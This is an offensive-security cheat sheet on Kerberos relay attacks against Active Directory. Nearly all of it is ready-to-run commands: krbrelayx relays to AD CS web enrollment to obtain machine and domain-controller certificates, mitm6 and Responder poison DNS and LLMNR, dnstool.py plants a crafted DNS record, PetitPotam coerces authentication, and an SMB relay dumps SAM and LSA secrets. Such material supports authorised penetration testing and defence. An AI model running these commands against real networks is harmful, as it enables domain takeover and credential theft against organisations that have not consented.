---
technique: Kerberos Relay
category: kerberos
targets: Services (HTTP/S, SMB, DNS)
protocols: Kerberos
remote_capable: true
tags: kerberos relay krbrelayx mitm6 coercion adcs ap-req apreq smb ad
---

# Kerberos Relay

Kerberos AP-REQ messages (service access requests containing a Service Ticket) can be relayed under specific conditions. Unlike NTLM relay, the target service and client must not enforce signing, and the AP-REQ can only be relayed to a service running under the same identity as the one the client originally targeted. The SPN class (HTTP, CIFS, HOST, etc.) is often ignored by Windows services, allowing cross-class relay within the same account. Common targets include AD CS HTTP enrollment endpoints (ESC8) because HTTP does not enforce signing by default.

## Linux

### krbrelayx (AD CS HTTP relay)

#python #dns-poisoning #adcs #esc8

Start a Kerberos relay listener that targets the AD CS HTTP endpoint.

```sh title:"Start Kerberos relay listener for AD CS HTTP"
krbrelayx.py --target "http://$adcs_fqdn/certsrv/" -ip "$lhost" --victim "$target_samname" --adcs --template Machine
```
<!-- cheat
import tun_ip
var adcs_fqdn
var target_samname
-->

### mitm6 (DNS poisoning)

#python #dns-poisoning #adcs #esc8

Poison IPv6 DNS with mitm6 to intercept Kerberos TKEY authentication from clients updating their DNS records.

```sh title:"Start IPv6 DNS poisoning for Kerberos relay"
mitm6 -i "$interface" -d "$domain" -hw "$target_fqdn" --relay "$adcs_fqdn" -v
```
<!-- cheat
import domain_ip
var adcs_fqdn
var target_fqdn
var interface
-->

### Step 1: Register DNS record for coercion target (dnstool.py)

#python #dns #coercion #adcs

Add a crafted DNS A record pointing to the attacker machine so coerced authentication resolves to it.

```sh title:"Register crafted DNS record via dnstool.py"
dnstool.py -u "$domain\\$user" -p "$pass" -r "${adcs_netbios}1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "$lhost" --action add "$rhost_ip" --tcp
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var adcs_netbios
-->

### Step 2: Start coerced Kerberos relay (krbrelayx)

#python #coercion #smb #adcs

Run the relay listener for the coerced Kerberos AP-REQ targeting the AD CS HTTP endpoint.

```sh title:"Start coerced Kerberos relay to AD CS HTTP"
krbrelayx.py -t "http://$adcs_fqdn/certsrv/certfnsh.asp" --adcs --template DomainController -v "$target_samname"
```
<!-- cheat
var adcs_fqdn
var target_samname
-->

### Step 3: Coerce Kerberos authentication (PetitPotam)

#python #coercion #smb #adcs

Coerce the target to authenticate to the crafted DNS record for relay.

```sh title:"Coerce Kerberos authentication with PetitPotam"
Petitpotam.py -d "$domain" -u "$user" -p "$pass" "${adcs_netbios}1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" "$target_ip"
```
<!-- cheat
import domain_ip
import users
import passwords
var adcs_fqdn
var adcs_netbios
var target_ip
-->

### krbrelayx (SMB to SMB)

#python #smb #unsigned

Relay a privileged Kerberos SMB authentication to an unsigned SMB target to dump SAM and LSA secrets.

```sh title:"Relay Kerberos SMB auth to unsigned SMB for credential dump"
krbrelayx.py -t "smb://$target_fqdn"
```
<!-- cheat
import domain_ip
var target_fqdn
-->

### Responder (multicast poisoning)

#python #llmnr #http #adcs

Poison LLMNR responses with a crafted response name to intercept Kerberos HTTP authentication.

```sh title:"Start LLMNR poisoning for Kerberos relay"
python3 Responder.py -I "$interface" -N "$relay_target_netbios"
```
<!-- cheat
var interface
var relay_target_netbios
-->

### krbrelayx (LLMNR to AD CS)

#python #llmnr #http #adcs

Relay the intercepted Kerberos HTTP authentication to AD CS.

```sh title:"Relay LLMNR-captured Kerberos auth to AD CS"
python3 krbrelayx.py --target "http://$adcs_fqdn/certsrv/" -ip "$lhost" --adcs --template User
```
<!-- cheat
import tun_ip
var adcs_fqdn
-->
